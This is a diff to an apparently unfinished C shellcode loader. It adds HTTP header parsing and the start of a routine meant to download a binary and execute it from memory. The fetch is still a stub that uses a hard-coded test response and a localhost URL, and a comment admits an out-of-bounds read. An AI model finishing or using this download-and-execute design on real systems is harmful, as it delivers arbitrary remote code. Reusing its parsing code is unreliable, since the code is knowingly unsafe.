@@ -3,9 +3,43 @@
 #include <string.h>  // memcpy, memset
 #include <sys/mman.h>  // mmap, mumap
 #include <errno.h>  // erno
+#include <inttypes.h>  // strtoumax
+#include <math.h>  // fmin
 
-#define MAX_BUFFER 1024
-#define MAX_RESPONSE 8192
+#define REQUEST_BUFFER 1024
+#define MAX_HEADER_BUFFER 64
+#define MAX_BINARY_BUFFER 65536
+#define MAX_RESPONSE_BUFFER 73728  //  extra 8192 bytes for headers
+
+/**
+ * Get the value of an HTTP header.
+ * @param headers a string containing the entire http headers without the body.
+ * @param header the header to look for (ex. "Content-Length").
+ * 			Length cannot be greater than MAX_HEADER_BUFFER (64)
+ * @param value where the result should be stored.
+ * 			Buffer length shuold equal to the max parameter.
+ * 			Will always be null terminated
+ * @param max max number of characters to read, including the null terminator.
+ * @return 0 indicating success, or -1 if failed
+ */
+int get_http_header(char* headers, char* header, char* value, size_t max) {
+	max--;  // make room for the null terminator
+	char delimeter[MAX_HEADER_BUFFER + 5];
+	snprintf(delimeter, MAX_HEADER_BUFFER + 5, "\r\n%s: ", header);  // add newline and color space to header delim
+
+	char* value_start = NULL;
+	if ((value_start = strstr(headers, delimeter)) == NULL) return -1;  // get the start of the header, check if failed
+	value_start += strlen(delimeter) * sizeof(char);  // modify to the start of the value
+	
+	int value_length = 0;
+	if ((value_length = strcspn(value_start, "\r")) == strlen(value_start)) return -1;  // set value_length, and check if failed
+
+	if (max > value_length) max = value_length;  // make sure only "max" characters are copied
+	memcpy(value, value_start, max);
+	value[max] = '\0';
+
+	return 0;
+}
 
 /**
  * Execute the shellcode
@@ -74,31 +108,40 @@ size_t get_shellcode(void** shellcode,
                             //          "\x6f\x72\x6c\x64\x21\x0d\x0a"
 
 	// construct get request
-	char http_request[MAX_BUFFER] = "GET ";
-	strncat(http_request, path, MAX_BUFFER - 1);
-	strncat(http_request, " HTTP/1.1\r\nHost: ", MAX_BUFFER - 1);
-	strncat(http_request, host, MAX_BUFFER - 1);
-	strncat(http_request, "\r\n\r\n", MAX_BUFFER - 1);
-	printf("Headers: \n%s\n", http_request);
+	char http_request[REQUEST_BUFFER];
+	if (snprintf(http_request, REQUEST_BUFFER, "GET %s HTTP/1.0\r\nHost: %s\r\n\r\n", path, host) > REQUEST_BUFFER - 1) return -1;
 
 	// response buffer
-	// char http_response[MAX_BUFFER];  // NOTE: maybe don't store it in a string, the binary data may contains null terminators
-	// memset(http_response, '\0', MAX_BUFFER);
+	// char http_response[MAX_RESPONSE_BUFFER];  // NOTE: maybe don't store it in a string, the binary data may contains null terminators
+	// memset(http_response, '\0', MAX_RESPONSE_BUFFER);
 
-	char http_response[] = "Test\r\nContent-Length: 311\r\n\r\nblob";  // just for testing
+
 	// TODO: actually fetch the binary here
+	// http://localhost:3000/test.bin
 
-	printf("Response: \n%s\n", http_response);
+	char http_response[] = "HTTP/1.1 200 OK\r\nServer: python\r\nContent-Length: 4\r\n\r\nrandom data.";  // just for testing
 
-	// search for Content-Length header
-	char* content_length_header = NULL;
-	char search_token[] = "Content-Length: ";
-	if ((content_length_header = strstr(http_response, search_token)) == NULL) return -1;
-	// if ((content_length_header = strtok(content_length_header, )) == NULL) return -1;
 
-	printf("CL Header: \n%s", content_length_header);
+	char content_length_string[6];
+	if (get_http_header(http_response, "Content-Length", content_length_string, 6) == -1) return -1;
 
-	size_t size = sizeof(hello_code) - 1;  // content-length;
+	char* endptr = NULL;
+	size_t content_length = strtoumax(content_length_string, &endptr, 10);
+	if (errno == ERANGE) return -1;  // content-length too large to store in size_t
+	if (content_length > MAX_BINARY_BUFFER) return -1;  // response too large to store in buffer
+
+	char shellcode_http[MAX_BINARY_BUFFER];
+	memset(shellcode_http, 0x00, MAX_BINARY_BUFFER);
+
+
+	// results in out of bound reads if the content-length is greater than the actual body
+	char* beginning_of_binary = NULL;
+	printf("%s\n", http_response);
+	if ((beginning_of_binary = strstr(http_response, "\r\n\r\n")) == NULL) return -1;  // misformatted
+	beginning_of_binary += 4 * sizeof(char);
+	printf("%s\n", beginning_of_binary);
+
+	size_t size = sizeof(hello_code) - 1;  // content-length
 	(*shellcode) = malloc(size);  // allocate memory to store shellcode
 
 	// copy shellcode to allocated memory
